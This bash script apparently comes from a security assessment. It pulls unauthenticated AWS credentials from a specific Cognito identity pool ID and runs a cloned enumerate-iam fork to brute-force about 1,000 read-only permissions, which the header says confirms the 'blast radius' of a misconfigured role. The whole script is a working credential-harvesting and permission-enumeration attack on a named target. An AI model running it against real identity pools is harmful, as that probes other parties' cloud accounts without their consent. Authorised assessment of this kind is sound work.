#!/usr/bin/env bash
# OPERATOR-RUN — full ~1000-endpoint permission brute via the FIXED enumerate-iam
# (skybound1 fork patches the botocore.vendored crash). Non-destructive: get_/list_/
# describe_ only. Confirms the true blast radius of RelayMobile_Unauth_Users_prod_NA.
set -uo pipefail
POOL="us-east-1:56106a99-23f8-4333-8edd-612af3b9de11"; REGION="us-east-1"
IDID=$(aws cognito-identity get-id --identity-pool-id "$POOL" --region "$REGION" --no-sign-request --query IdentityId --output text)
CREDS=$(aws cognito-identity get-credentials-for-identity --identity-id "$IDID" --region "$REGION" --no-sign-request)
AK="$(jq -r .Credentials.AccessKeyId <<<"$CREDS")"
SK="$(jq -r .Credentials.SecretKey <<<"$CREDS")"
ST="$(jq -r .Credentials.SessionToken <<<"$CREDS")"
echo "role: $(AWS_ACCESS_KEY_ID=$AK AWS_SECRET_ACCESS_KEY=$SK AWS_SESSION_TOKEN=$ST aws sts get-caller-identity --query Arn --output text --region $REGION 2>&1)"

DIR="$HOME/tools/enumerate-iam-fixed"
if [ ! -f "$DIR/enumerate-iam.py" ]; then
  git clone -q https://github.com/skybound1/enumerate-iam "$DIR" 2>&1 | tail -1
  pip3 install -q requests 2>/dev/null || true
  pip3 install -q -r "$DIR/requirements.txt" 2>/dev/null || true
fi
# fallback: if the fork still imports botocore.vendored, shim it
python3 - <<'PY' 2>/dev/null || true
import botocore, types, sys
if not hasattr(botocore, "vendored"):
    import requests as _r
    v=types.ModuleType("botocore.vendored"); v.requests=_r
    sys.modules["botocore.vendored"]=v
PY
echo "################ enumerate-iam (full surface) — ALLOWED actions only ################"
( cd "$DIR" && python3 enumerate-iam.py --access-key "$AK" --secret-key "$SK" --session-token "$ST" 2>&1 ) \
  | grep -aiE '\-\- [a-z].*\.(list|describe|get)|supported|found|allow|root account' \
  | grep -aivE 'AccessDenied|not authorized|denied|DEBUG|INFO.*attempt' | head -80
echo "################ (if the above is only sqs.list_queues -> role is ListQueues-only, hold as Low) ################"
